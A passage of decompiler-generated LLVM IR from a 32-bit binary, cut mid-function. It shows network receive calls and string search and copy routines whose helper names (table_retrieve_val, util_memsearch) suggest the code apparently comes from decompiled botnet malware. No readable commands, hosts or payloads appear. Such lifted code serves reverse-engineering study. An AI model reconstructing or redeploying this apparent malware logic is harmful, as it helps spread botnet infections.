  %v9_8049d27 = icmp eq i32 %v1_8049d27, 0
  store i1 %v9_8049d27, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d27, i32* @esi, align 4
  %v0_8049d2d = load i32, i32* @ebp, align 4
  %v2_8049d2d = add i32 %v0_8049d18, 8
  %v3_8049d2d = inttoptr i32 %v2_8049d2d to i32*
  store i32 %v0_8049d2d, i32* %v3_8049d2d, align 4
  %v1_8049d2e = add i32 %v0_8049d18, 4
  %v2_8049d2e = inttoptr i32 %v1_8049d2e to i32*
  store i32 255, i32* %v2_8049d2e, align 4
  %v0_8049d33 = load i32, i32* @esi, align 4
  %v3_8049d33 = inttoptr i32 %v0_8049d18 to i32*
  store i32 %v0_8049d33, i32* %v3_8049d33, align 4
  %v2_8049d34 = call i32 @util_zero(i32 %stack_var_-20888.0, i32 %v3_8048a9f)
  store i32 %v2_8049d34, i32* %eax.global-to-local, align 4
  %v0_8049d39 = load i32, i32* @esp, align 4
  %v1_8049d39 = inttoptr i32 %v0_8049d39 to i32*
  %v2_8049d39 = load i32, i32* %v1_8049d39, align 4
  store i32 %v2_8049d39, i32* %ecx.global-to-local, align 4
  %v0_8049d3a = load i32, i32* @ebx, align 4
  store i32 %v0_8049d3a, i32* %eax.global-to-local, align 4
  %v1_8049d3c = add i32 %v0_8049d39, 20916
  %v2_8049d3c = inttoptr i32 %v1_8049d3c to i32*
  %v3_8049d3c = load i32, i32* %v2_8049d3c, align 4
  store i32 %v3_8049d3c, i32* %edx.global-to-local, align 4
  %v2_8049d43 = add i32 %v3_8049d3c, %v0_8049d3a
  %v12_8049d43 = icmp eq i32 %v2_8049d43, 0
  store i1 %v12_8049d43, i1* %zf.global-to-local, align 1
  store i32 %v2_8049d43, i32* %eax.global-to-local, align 4
  store i32 %v2_8049d43, i32* %v1_8049d39, align 4
  %v2_8049d46 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049d46, i32* %eax.global-to-local, align 4
  %v0_8049d4b = load i32, i32* @esp, align 4
  %v1_8049d4e = icmp eq i32 %v2_8049d46, 0
  store i1 %v1_8049d4e, i1* %zf.global-to-local, align 1
  %tmp130 = icmp slt i32 %v2_8049d46, 1
  br i1 %tmp130, label %dec_label_pc_8049d67, label %dec_label_pc_8049d52

dec_label_pc_8049d52:                             ; preds = %dec_label_pc_8049d22
  %v2_8049d52 = add i32 %v0_8049d4b, 12
  %v3_8049d52 = inttoptr i32 %v2_8049d52 to i32*
  store i32 %v2_8049d46, i32* %v3_8049d52, align 4
  %v2_8049d53 = add i32 %v0_8049d4b, 8
  %v3_8049d53 = inttoptr i32 %v2_8049d53 to i32*
  store i32 %v2_8049d46, i32* %v3_8049d53, align 4
  %v1_8049d54 = add i32 %v0_8049d4b, 20916
  %v2_8049d54 = inttoptr i32 %v1_8049d54 to i32*
  %v3_8049d54 = load i32, i32* %v2_8049d54, align 4
  store i32 %v3_8049d54, i32* @eax, align 4
  %v0_8049d5b = load i32, i32* @ebx, align 4
  %v2_8049d5b = add i32 %v0_8049d5b, %v3_8049d54
  %v12_8049d5b = icmp eq i32 %v2_8049d5b, 0
  store i1 %v12_8049d5b, i1* %zf.global-to-local, align 1
  store i32 %v2_8049d5b, i32* @ebx, align 4
  %v2_8049d5d = add i32 %v0_8049d4b, 4
  %v3_8049d5d = inttoptr i32 %v2_8049d5d to i32*
  store i32 %v2_8049d5b, i32* %v3_8049d5d, align 4
  %v0_8049d5e = load i32, i32* @esi, align 4
  %v3_8049d5e = inttoptr i32 %v0_8049d4b to i32*
  store i32 %v0_8049d5e, i32* %v3_8049d5e, align 4
  %v3_8049d5f = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049d5f, i32* %eax.global-to-local, align 4
  %v0_8049d64 = load i32, i32* @esp, align 4
  %v6_8049d64 = icmp eq i32 %v0_8049d64, -16
  store i1 %v6_8049d64, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049d67

dec_label_pc_8049d67:                             ; preds = %dec_label_pc_8049753, %dec_label_pc_8049618, %dec_label_pc_8049d22, %dec_label_pc_8049d01, %dec_label_pc_8049ed2, %dec_label_pc_8049e9b, %dec_label_pc_8049e92, %dec_label_pc_8049d52
  %v0_8049d67 = load i32, i32* @edi, align 4
  %v1_8049d67 = add i32 %v0_8049d67, -1448
  %v2_8049d67 = inttoptr i32 %v1_8049d67 to i8*
  store i8 1, i8* %v2_8049d67, align 1
  br label %dec_label_pc_8048e80

dec_label_pc_8049d73:                             ; preds = %dec_label_pc_8048e75
  %v2_8049d73 = call i32 @__GI___errno_location(i32 %stack_var_-20888.0, i32 %v3_8048a9f)
  store i32 %v2_8049d73, i32* %eax.global-to-local, align 4
  store i32 %v2_8049d73, i32* @ebx, align 4
  br label %dec_label_pc_8049d7a

dec_label_pc_8049d7a:                             ; preds = %dec_label_pc_8049da9, %dec_label_pc_8049d73
  %v0_8049d7a = phi i32 [ %v2_8049d73, %dec_label_pc_8049d73 ], [ %v0_8049d7a.pre, %dec_label_pc_8049da9 ]
  %v1_8049d7a = inttoptr i32 %v0_8049d7a to i32*
  store i32 0, i32* %v1_8049d7a, align 4
  %v0_8049d80 = load i32, i32* @esp, align 4
  %v1_8049d80 = add i32 %v0_8049d80, -4
  %v2_8049d80 = inttoptr i32 %v1_8049d80 to i32*
  store i32 16384, i32* %v2_8049d80, align 4
  %v1_8049d85 = add i32 %v0_8049d80, -8
  %v2_8049d85 = inttoptr i32 %v1_8049d85 to i32*
  store i32 10240, i32* %v2_8049d85, align 4
  %v1_8049d8a = add i32 %v0_8049d80, 131
  store i32 %v1_8049d8a, i32* %eax.global-to-local, align 4
  %v2_8049d91 = add i32 %v0_8049d80, -12
  %v3_8049d91 = inttoptr i32 %v2_8049d91 to i32*
  store i32 %v1_8049d8a, i32* %v3_8049d91, align 4
  %v0_8049d92 = load i32, i32* @edi, align 4
  %v1_8049d92 = add i32 %v0_8049d92, -1452
  %v2_8049d92 = inttoptr i32 %v1_8049d92 to i32*
  %v3_8049d92 = load i32, i32* %v2_8049d92, align 4
  store i32 %v3_8049d92, i32* %ecx.global-to-local, align 4
  %v2_8049d98 = add i32 %v0_8049d80, -16
  %v3_8049d98 = inttoptr i32 %v2_8049d98 to i32*
  store i32 %v3_8049d92, i32* %v3_8049d98, align 4
  %v0_8049d99 = call i32 @__libc_recv()
  store i32 %v0_8049d99, i32* @eax, align 4
  %v1_8049da1 = icmp eq i32 %v0_8049d99, 0
  store i1 %v1_8049da1, i1* %zf.global-to-local, align 1
  br i1 %v1_8049da1, label %dec_label_pc_804951a, label %dec_label_pc_8049da9

dec_label_pc_8049da9:                             ; preds = %dec_label_pc_8049d7a
  %v1_8049da9 = add i32 %v0_8049d99, 1
  %v8_8049da9 = icmp eq i32 %v1_8049da9, 0
  store i1 %v8_8049da9, i1* %zf.global-to-local, align 1
  store i32 %v1_8049da9, i32* @eax, align 4
  %v1_8049daa = icmp eq i1 %v8_8049da9, false
  %v0_8049d7a.pre = load i32, i32* @ebx, align 4
  br i1 %v1_8049daa, label %dec_label_pc_8049d7a, label %dec_label_pc_8049dac

dec_label_pc_8049dac:                             ; preds = %dec_label_pc_8049da9
  %v1_8049dac = inttoptr i32 %v0_8049d7a.pre to i32*
  %v2_8049dac = load i32, i32* %v1_8049dac, align 4
  %v11_8049dac = icmp eq i32 %v2_8049dac, 11
  store i1 %v11_8049dac, i1* %zf.global-to-local, align 1
  %v1_8049daf = icmp eq i1 %v11_8049dac, false
  br i1 %v1_8049daf, label %dec_label_pc_8049520, label %dec_label_pc_8049db5

dec_label_pc_8049db5:                             ; preds = %dec_label_pc_8049dac
  %v0_8049db5 = load i32, i32* @edi, align 4
  %v1_8049db5 = add i32 %v0_8049db5, -1448
  %v2_8049db5 = inttoptr i32 %v1_8049db5 to i8*
  %v3_8049db5 = load i8, i8* %v2_8049db5, align 1
  %v4_8049db5 = icmp eq i8 %v3_8049db5, 0
  store i1 %v4_8049db5, i1* %zf.global-to-local, align 1
  br i1 %v4_8049db5, label %dec_label_pc_8048e80, label %dec_label_pc_8049dc2

dec_label_pc_8049dc2:                             ; preds = %dec_label_pc_8049db5
  store i8 1, i8* %v2_8049db5, align 1
  br label %dec_label_pc_8048e80

dec_label_pc_8049dce:                             ; preds = %dec_label_pc_8049b38, %dec_label_pc_8049b0b
  %v1_8049b31.lcssa = phi i32 [ %v1_8049b31, %dec_label_pc_8049b38 ], [ 0, %dec_label_pc_8049b0b ]
  %v2_8049dce = add i32 %v0_8049b2e, 12
  %v3_8049dce = inttoptr i32 %v2_8049dce to i32*
  store i32 %v1_8049b31.lcssa, i32* %v3_8049dce, align 4
  %v0_8049dcf = load i32, i32* %eax.global-to-local, align 4
  %v2_8049dcf = add i32 %v0_8049b2e, 8
  %v3_8049dcf = inttoptr i32 %v2_8049dcf to i32*
  store i32 %v0_8049dcf, i32* %v3_8049dcf, align 4
  %v1_8049dd0 = add i32 %v0_8049b2e, 4
  %v2_8049dd0 = inttoptr i32 %v1_8049dd0 to i32*
  store i32 0, i32* %v2_8049dd0, align 4
  %v2_8049dd2 = inttoptr i32 %v0_8049b2e to i32*
  store i32 45, i32* %v2_8049dd2, align 4
  %v3_8049dd4 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049dd4, i32* %eax.global-to-local, align 4
  %v0_8049dd9 = load i32, i32* @esp, align 4
  %v9_8049dd9 = icmp eq i32 %v0_8049dd9, -12
  store i1 %v9_8049dd9, i1* %zf.global-to-local, align 1
  %v2_8049ddc = add i32 %v0_8049dd9, 8
  %v3_8049ddc = inttoptr i32 %v2_8049ddc to i32*
  store i32 %v3_8049dd4, i32* %v3_8049ddc, align 4
  %v1_8049ddd = add i32 %v0_8049dd9, 124
  %v2_8049ddd = inttoptr i32 %v1_8049ddd to i32*
  %v3_8049ddd = load i32, i32* %v2_8049ddd, align 4
  store i32 %v3_8049ddd, i32* %eax.global-to-local, align 4
  %v2_8049de1 = add i32 %v0_8049dd9, 4
  %v3_8049de1 = inttoptr i32 %v2_8049de1 to i32*
  store i32 %v3_8049ddd, i32* %v3_8049de1, align 4
  %v1_8049de2 = add i32 %v0_8049dd9, 147
  store i32 %v1_8049de2, i32* @ecx, align 4
  %v3_8049de9 = inttoptr i32 %v0_8049dd9 to i32*
  store i32 %v1_8049de2, i32* %v3_8049de9, align 4
  %v4_8049dea = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  %v0_8049def = load i32, i32* @esp, align 4
  %v1_8049df2 = add i32 %v4_8049dea, 1
  %v8_8049df2 = icmp eq i32 %v1_8049df2, 0
  store i1 %v8_8049df2, i1* %zf.global-to-local, align 1
  store i32 %v1_8049df2, i32* %eax.global-to-local, align 4
  br i1 %v8_8049df2, label %dec_label_pc_8049f51, label %dec_label_pc_8049df9

dec_label_pc_8049df9:                             ; preds = %dec_label_pc_8049dce
  %v2_8049df9 = add i32 %v0_8049def, 12
  %v3_8049df9 = inttoptr i32 %v2_8049df9 to i32*
  store i32 %v1_8049df2, i32* %v3_8049df9, align 4
  %v0_8049dfa = load i32, i32* %eax.global-to-local, align 4
  %v2_8049dfa = add i32 %v0_8049def, 8
  %v3_8049dfa = inttoptr i32 %v2_8049dfa to i32*
  store i32 %v0_8049dfa, i32* %v3_8049dfa, align 4
  %v1_8049dfb = add i32 %v0_8049def, 4
  %v2_8049dfb = inttoptr i32 %v1_8049dfb to i32*
  store i32 0, i32* %v2_8049dfb, align 4
  %v2_8049dfd = inttoptr i32 %v0_8049def to i32*
  store i32 45, i32* %v2_8049dfd, align 4
  %v3_8049dff = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049dff, i32* %eax.global-to-local, align 4
  %v0_8049e04 = load i32, i32* @esp, align 4
  %v9_8049e04 = icmp eq i32 %v0_8049e04, -12
  store i1 %v9_8049e04, i1* %zf.global-to-local, align 1
  %v2_8049e07 = add i32 %v0_8049e04, 8
  %v3_8049e07 = inttoptr i32 %v2_8049e07 to i32*
  store i32 %v3_8049dff, i32* %v3_8049e07, align 4
  %v1_8049e08 = add i32 %v0_8049e04, 124
  %v2_8049e08 = inttoptr i32 %v1_8049e08 to i32*
  %v3_8049e08 = load i32, i32* %v2_8049e08, align 4
  %v2_8049e0c = add i32 %v0_8049e04, 4
  %v3_8049e0c = inttoptr i32 %v2_8049e0c to i32*
  store i32 %v3_8049e08, i32* %v3_8049e0c, align 4
  %v1_8049e0d = add i32 %v0_8049e04, 147
  store i32 %v1_8049e0d, i32* %eax.global-to-local, align 4
  %v3_8049e14 = inttoptr i32 %v0_8049e04 to i32*
  store i32 %v1_8049e0d, i32* %v3_8049e14, align 4
  %v4_8049e15 = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049e15, i32* %eax.global-to-local, align 4
  %v0_8049e1a = load i32, i32* @esp, align 4
  %v6_8049e1a = icmp eq i32 %v0_8049e1a, -16
  store i1 %v6_8049e1a, i1* %zf.global-to-local, align 1
  store i32 %v4_8049e15, i32* %ebx.global-to-local, align 4
  %v3_8049e1f = add i32 %v4_8049e15, 147
  %v4_8049e1f = add i32 %v3_8049e1f, %v0_8049e1a
  %v5_8049e1f = inttoptr i32 %v4_8049e1f to i8*
  %v6_8049e1f = load i8, i8* %v5_8049e1f, align 1
  %v12_8049e1f = icmp eq i8 %v6_8049e1f, 32
  %v1_8049e27 = zext i1 %v12_8049e1f to i32
  %v1_8049e2a = add i32 %v0_8049e1a, 147
  store i32 %v1_8049e2a, i32* %esi.global-to-local, align 4
  store i32 %v1_8049e27, i32* %eax.global-to-local, align 4
  %v1_8049e36 = add i32 %v0_8049e1a, 12
  %v2_8049e36 = inttoptr i32 %v1_8049e36 to i32*
  store i32 2, i32* %v2_8049e36, align 4
  %v1_8049e38 = add i32 %v0_8049e1a, 8
  %v2_8049e38 = inttoptr i32 %v1_8049e38 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_8049e38, align 4
  %v0_8049e3d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049e3d = load i32, i32* %eax.global-to-local, align 4
  %v2_8049e3d = add i32 %v1_8049e3d, %v0_8049e3d
  store i32 %v2_8049e3d, i32* @ebx, align 4
  %v1_8049e3f = add i32 %v0_8049e1a, 124
  %v2_8049e3f = inttoptr i32 %v1_8049e3f to i32*
  %v3_8049e3f = load i32, i32* %v2_8049e3f, align 4
  %v2_8049e43 = sub i32 %v3_8049e3f, %v2_8049e3d
  store i32 %v2_8049e43, i32* %eax.global-to-local, align 4
  %v0_8049e45 = load i32, i32* %esi.global-to-local, align 4
  %v2_8049e45 = add i32 %v0_8049e45, %v2_8049e3d
  %v12_8049e45 = icmp eq i32 %v2_8049e45, 0
  store i1 %v12_8049e45, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e45, i32* @esi, align 4
  %v2_8049e47 = add i32 %v0_8049e1a, 4
  %v3_8049e47 = inttoptr i32 %v2_8049e47 to i32*
  store i32 %v2_8049e43, i32* %v3_8049e47, align 4
  %v0_8049e48 = load i32, i32* @esi, align 4
  %v3_8049e48 = inttoptr i32 %v0_8049e1a to i32*
  store i32 %v0_8049e48, i32* %v3_8049e48, align 4
  %v4_8049e49 = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049e49, i32* %eax.global-to-local, align 4
  %v0_8049e4e = load i32, i32* @esp, align 4
  store i32 %v4_8049e49, i32* %edx.global-to-local, align 4
  %v10_8049e53 = icmp eq i32 %v4_8049e49, -1
  store i1 %v10_8049e53, i1* %zf.global-to-local, align 1
  br i1 %v10_8049e53, label %dec_label_pc_8049f51, label %dec_label_pc_8049e5c

dec_label_pc_8049e5c:                             ; preds = %dec_label_pc_8049df9
  %v10_8049e5c = icmp eq i32 %v4_8049e49, 1
  store i1 %v10_8049e5c, i1* %zf.global-to-local, align 1
  %v7_8049e5f = icmp sgt i32 %v4_8049e49, 1
  br i1 %v7_8049e5f, label %dec_label_pc_8049e61, label %dec_label_pc_8049e64

dec_label_pc_8049e61:                             ; preds = %dec_label_pc_8049e5c
  %v1_8049e61 = add i32 %v4_8049e49, -2
  %v9_8049e61 = icmp eq i32 %v1_8049e61, 0
  store i1 %v9_8049e61, i1* %zf.global-to-local, align 1
  store i32 %v1_8049e61, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049e64

dec_label_pc_8049e64:                             ; preds = %dec_label_pc_8049e5c, %dec_label_pc_8049e61
  %v1_8049e6b = phi i32 [ %v4_8049e49, %dec_label_pc_8049e5c ], [ %v1_8049e61, %dec_label_pc_8049e61 ]
  %v1_8049e64 = add i32 %v0_8049e4e, 20920
  %v2_8049e6b = add i32 %v1_8049e64, %v1_8049e6b
  %v12_8049e6b = icmp eq i32 %v2_8049e6b, 0
  store i1 %v12_8049e6b, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e6b, i32* %eax.global-to-local, align 4
  %v0_8049e6d = load i32, i32* @ebx, align 4
  %v2_8049e6d = add i32 %v2_8049e6b, -20773
  %v3_8049e6d = add i32 %v2_8049e6d, %v0_8049e6d
  %v4_8049e6d = inttoptr i32 %v3_8049e6d to i8*
  store i8 0, i8* %v4_8049e6d, align 1
  %v0_8049e75 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049e75 = add i32 %v0_8049e75, 1
  store i32 %v1_8049e75, i32* @ebx, align 4
  %v0_8049e78 = load i32, i32* @esp, align 4
  %v1_8049e78 = add i32 %v0_8049e78, -4
  %v2_8049e78 = inttoptr i32 %v1_8049e78 to i32*
  store i32 4, i32* %v2_8049e78, align 4
  %v1_8049e7a = add i32 %v0_8049e78, -8
  %v2_8049e7a = inttoptr i32 %v1_8049e7a to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_805586b.22 to i32), i32* %v2_8049e7a, align 4
  %v0_8049e7f = load i32, i32* @ebx, align 4
  %v2_8049e7f = add i32 %v0_8049e78, -12
  %v3_8049e7f = inttoptr i32 %v2_8049e7f to i32*
  store i32 %v0_8049e7f, i32* %v3_8049e7f, align 4
  %v0_8049e80 = load i32, i32* @esi, align 4
  %v2_8049e80 = add i32 %v0_8049e78, -16
  %v3_8049e80 = inttoptr i32 %v2_8049e80 to i32*
  store i32 %v0_8049e80, i32* %v3_8049e80, align 4
  %v4_8049e81 = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049e81, i32* @eax, align 4
  %v0_8049e86 = load i32, i32* @esp, align 4
  %v9_8049e89 = icmp eq i32 %v4_8049e81, 4
  store i1 %v9_8049e89, i1* %zf.global-to-local, align 1
  br i1 %v9_8049e89, label %dec_label_pc_804a234, label %dec_label_pc_8049e92

dec_label_pc_8049e92:                             ; preds = %dec_label_pc_8049e64
  %v0_8049e92 = load i32, i32* @esi, align 4
  %v1_8049e92 = inttoptr i32 %v0_8049e92 to i8*
  %v2_8049e92 = load i8, i8* %v1_8049e92, align 1
  %v11_8049e92 = icmp eq i8 %v2_8049e92, 47
  store i1 %v11_8049e92, i1* %zf.global-to-local, align 1
  %v1_8049e95 = icmp eq i1 %v11_8049e92, false
  br i1 %v1_8049e95, label %dec_label_pc_8049d67, label %dec_label_pc_8049e9b

dec_label_pc_8049e9b:                             ; preds = %dec_label_pc_8049e92
  %v1_8049e9b = add i32 %v0_8049e86, 112
  %v2_8049e9b = inttoptr i32 %v1_8049e9b to i32*
  %v3_8049e9b = load i32, i32* %v2_8049e9b, align 4
  %v1_8049e9f = add i32 %v0_8049e92, 1
  store i32 %v1_8049e9f, i32* @ebx, align 4
  %v1_8049ea2 = add i32 %v3_8049e9b, 533
  %v9_8049ea2 = icmp eq i32 %v1_8049ea2, 0
  store i1 %v9_8049ea2, i1* %zf.global-to-local, align 1
  store i32 %v1_8049ea2, i32* @ebp, align 4
  %v2_8049ea8 = add i32 %v0_8049e86, 12
  %v3_8049ea8 = inttoptr i32 %v2_8049ea8 to i32*
  store i32 %v4_8049e81, i32* %v3_8049ea8, align 4
  %v2_8049ea9 = add i32 %v0_8049e86, 8
  %v3_8049ea9 = inttoptr i32 %v2_8049ea9 to i32*
  store i32 %v4_8049e81, i32* %v3_8049ea9, align 4
  %v1_8049eaa = add i32 %v0_8049e86, 4
  %v2_8049eaa = inttoptr i32 %v1_8049eaa to i32*
  store i32 255, i32* %v2_8049eaa, align 4
  %v0_8049eaf = load i32, i32* @ebp, align 4
  %v3_8049eaf = inttoptr i32 %v0_8049e86 to i32*
  store i32 %v0_8049eaf, i32* %v3_8049eaf, align 4
  %v2_8049eb0 = call i32 @util_zero(i32 %stack_var_-20888.0, i32 %v3_8048a9f)
  store i32 %v2_8049eb0, i32* %eax.global-to-local, align 4
  %v0_8049eb5 = load i32, i32* @esp, align 4
  %v1_8049eb5 = inttoptr i32 %v0_8049eb5 to i32*
  %v2_8049eb5 = load i32, i32* %v1_8049eb5, align 4
  store i32 %v2_8049eb5, i32* @esi, align 4
  %v0_8049eb6 = load i32, i32* @ebx, align 4
  store i32 %v0_8049eb6, i32* %eax.global-to-local, align 4
  %v1_8049eb8 = add i32 %v0_8049eb5, 20916
  %v2_8049eb8 = inttoptr i32 %v1_8049eb8 to i32*
  %v3_8049eb8 = load i32, i32* %v2_8049eb8, align 4
  store i32 %v3_8049eb8, i32* %ecx.global-to-local, align 4
  %v2_8049ebf = add i32 %v3_8049eb8, %v0_8049eb6
  %v12_8049ebf = icmp eq i32 %v2_8049ebf, 0
  store i1 %v12_8049ebf, i1* %zf.global-to-local, align 1
  store i32 %v2_8049ebf, i32* %eax.global-to-local, align 4
  store i32 %v2_8049ebf, i32* %v1_8049eb5, align 4
  %v2_8049ec2 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049ec2, i32* %eax.global-to-local, align 4
  %v0_8049ec7 = load i32, i32* @esp, align 4
  %v1_8049eca = icmp eq i32 %v2_8049ec2, 0
  store i1 %v1_8049eca, i1* %zf.global-to-local, align 1
  %tmp131 = icmp slt i32 %v2_8049ec2, 1
  br i1 %tmp131, label %dec_label_pc_8049d67, label %dec_label_pc_8049ed2

dec_label_pc_8049ed2:                             ; preds = %dec_label_pc_8049e9b
  %v0_8049ed5 = load i32, i32* @ebx, align 4
  store i32 %v0_8049ed5, i32* %eax.global-to-local, align 4
  %v1_8049ed7 = add i32 %v0_8049ec7, 20916
  %v2_8049ed7 = inttoptr i32 %v1_8049ed7 to i32*
  %v3_8049ed7 = load i32, i32* %v2_8049ed7, align 4
  store i32 %v3_8049ed7, i32* %edx.global-to-local, align 4
  %v2_8049ede = add i32 %v3_8049ed7, %v0_8049ed5
  %v12_8049ede = icmp eq i32 %v2_8049ede, 0
  store i1 %v12_8049ede, i1* %zf.global-to-local, align 1
  store i32 %v2_8049ede, i32* %eax.global-to-local, align 4
  %v3_8049ee0 = inttoptr i32 %v0_8049ec7 to i32*
  store i32 %v2_8049ede, i32* %v3_8049ee0, align 4
  %v2_8049ee1 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049ee1, i32* %eax.global-to-local, align 4
  %v0_8049ee6 = load i32, i32* @esp, align 4
  %v1_8049ee9 = add i32 %v2_8049ee1, -255
  %v6_8049ee9 = sub i32 254, %v2_8049ee1
  %v7_8049ee9 = and i32 %v6_8049ee9, %v2_8049ee1
  %v8_8049ee9 = icmp slt i32 %v7_8049ee9, 0
  %v9_8049ee9 = icmp eq i32 %v1_8049ee9, 0
  store i1 %v9_8049ee9, i1* %zf.global-to-local, align 1
  %v10_8049ee9 = icmp slt i32 %v1_8049ee9, 0
  %v3_8049eee = icmp eq i1 %v10_8049ee9, %v8_8049ee9
  %v4_8049eee = icmp eq i1 %v9_8049ee9, false
  %v5_8049eee = and i1 %v4_8049eee, %v3_8049eee
  br i1 %v5_8049eee, label %dec_label_pc_8049d67, label %dec_label_pc_8049ef4

dec_label_pc_8049ef4:                             ; preds = %dec_label_pc_8049ed2
  %v2_8049ef4 = add i32 %v0_8049ee6, 12
  %v3_8049ef4 = inttoptr i32 %v2_8049ef4 to i32*
  store i32 %v2_8049ee1, i32* %v3_8049ef4, align 4
  %v2_8049ef5 = add i32 %v0_8049ee6, 8
  %v3_8049ef5 = inttoptr i32 %v2_8049ef5 to i32*
  store i32 %v2_8049ee1, i32* %v3_8049ef5, align 4
  %v1_8049ef6 = add i32 %v0_8049ee6, 20916
  %v2_8049ef6 = inttoptr i32 %v1_8049ef6 to i32*
  %v3_8049ef6 = load i32, i32* %v2_8049ef6, align 4
  store i32 %v3_8049ef6, i32* @eax, align 4
  %v0_8049efd = load i32, i32* @ebx, align 4
  %v2_8049efd = add i32 %v0_8049efd, %v3_8049ef6
  %v12_8049efd = icmp eq i32 %v2_8049efd, 0
  store i1 %v12_8049efd, i1* %zf.global-to-local, align 1
  store i32 %v2_8049efd, i32* @ebx, align 4
  %v2_8049eff = add i32 %v0_8049ee6, 4
  %v3_8049eff = inttoptr i32 %v2_8049eff to i32*
  store i32 %v2_8049efd, i32* %v3_8049eff, align 4
  %v0_8049f00 = load i32, i32* @ebp, align 4
  %v3_8049f00 = inttoptr i32 %v0_8049ee6 to i32*
  store i32 %v0_8049f00, i32* %v3_8049f00, align 4
  %v3_8049f01 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049f01, i32* %eax.global-to-local, align 4
  %v0_8049f06 = load i32, i32* @esp, align 4
  %v6_8049f06 = icmp eq i32 %v0_8049f06, -16
  store i1 %v6_8049f06, i1* %zf.global-to-local, align 1
  %v0_8049f09 = load i32, i32* @edi, align 4
  %v1_8049f09 = add i32 %v0_8049f09, -1448
  %v2_8049f09 = inttoptr i32 %v1_8049f09 to i8*
  store i8 1, i8* %v2_8049f09, align 1
  br label %dec_label_pc_8048e80

dec_label_pc_8049f15:                             ; preds = %dec_label_pc_8049462
  %v2_8049f15 = add i32 %v0_8049475, 12
  %v3_8049f15 = inttoptr i32 %v2_8049f15 to i32*
  store i32 %v0_8049470, i32* %v3_8049f15, align 4
  %v2_8049f16 = add i32 %v0_8049475, 8
  %v3_8049f16 = inttoptr i32 %v2_8049f16 to i32*
  store i32 %v0_8049470, i32* %v3_8049f16, align 4
  %v0_8049f17 = load i32, i32* @ebx, align 4
  %v2_8049f17 = add i32 %v0_8049475, 4
  %v3_8049f17 = inttoptr i32 %v2_8049f17 to i32*
  store i32 %v0_8049f17, i32* %v3_8049f17, align 4
  %v1_8049f18 = add i32 %v0_8049475, 68
  %v2_8049f18 = inttoptr i32 %v1_8049f18 to i32*
  %v3_8049f18 = load i32, i32* %v2_8049f18, align 4
  store i32 %v3_8049f18, i32* @eax, align 4
  %v3_8049f1c = inttoptr i32 %v0_8049475 to i32*
  store i32 %v3_8049f18, i32* %v3_8049f1c, align 4
  %v3_8049f1d = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049f1d, i32* %eax.global-to-local, align 4
  %v0_8049f22 = load i32, i32* @esp, align 4
  %v1_8049f22 = add i32 %v0_8049f22, 16
  %v6_8049f22 = icmp eq i32 %v1_8049f22, 0
  store i1 %v6_8049f22, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049480

dec_label_pc_8049f2a:                             ; preds = %dec_label_pc_8049598
  %v0_8049f2a = load i32, i32* @ebp, align 4
  %v1_8049f2a = inttoptr i32 %v0_8049f2a to i32*
  store i32 104, i32* %v1_8049f2a, align 4
  br label %dec_label_pc_8049520

dec_label_pc_8049f36:                             ; preds = %dec_label_pc_80495cd
  %v0_8049f36 = load i32, i32* @ebp, align 4
  %v1_8049f36 = inttoptr i32 %v0_8049f36 to i32*
  %v2_8049f36 = load i32, i32* %v1_8049f36, align 4
  %v11_8049f36 = icmp eq i32 %v2_8049f36, 11
  store i1 %v11_8049f36, i1* %zf.global-to-local, align 1
  %v1_8049f3a = icmp eq i1 %v11_8049f36, false
  br i1 %v1_8049f3a, label %dec_label_pc_8049520, label %dec_label_pc_8048e80

dec_label_pc_8049f45:                             ; preds = %dec_label_pc_8049a57
  %v0_8049f45 = load i32, i32* @edi, align 4
  %v1_8049f45 = add i32 %v0_8049f45, 12
  %v2_8049f45 = inttoptr i32 %v1_8049f45 to i32*
  store i32 0, i32* %v2_8049f45, align 4
  br label %dec_label_pc_8049b09

dec_label_pc_8049f51:                             ; preds = %dec_label_pc_8049df9, %dec_label_pc_8049dce
  %v1_8049f51.in = phi i32 [ %v0_8049e4e, %dec_label_pc_8049df9 ], [ %v0_8049def, %dec_label_pc_8049dce ]
  %v0_8049f51 = phi i32 [ -1, %dec_label_pc_8049df9 ], [ 0, %dec_label_pc_8049dce ]
  %v2_8049f51 = add i32 %v1_8049f51.in, 12
  %v3_8049f51 = inttoptr i32 %v2_8049f51 to i32*
  store i32 %v0_8049f51, i32* %v3_8049f51, align 4
  %v0_8049f52 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049f52 = add i32 %v1_8049f51.in, 8
  %v3_8049f52 = inttoptr i32 %v2_8049f52 to i32*
  store i32 %v0_8049f52, i32* %v3_8049f52, align 4
  %v1_8049f53 = add i32 %v1_8049f51.in, 4
  %v2_8049f53 = inttoptr i32 %v1_8049f53 to i32*
  store i32 0, i32* %v2_8049f53, align 4
  %v2_8049f55 = inttoptr i32 %v1_8049f51.in to i32*
